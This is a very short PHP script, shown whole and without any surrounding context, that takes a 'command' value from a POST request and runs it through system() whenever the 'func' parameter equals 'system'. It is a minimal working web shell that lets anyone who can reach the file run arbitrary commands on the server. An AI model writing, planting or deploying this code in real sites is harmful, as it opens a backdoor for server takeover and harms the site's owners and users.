<?php
$execfunc = $_POST['func'];
    if ($execfunc=="system")
        system($_POST['command']); 

?>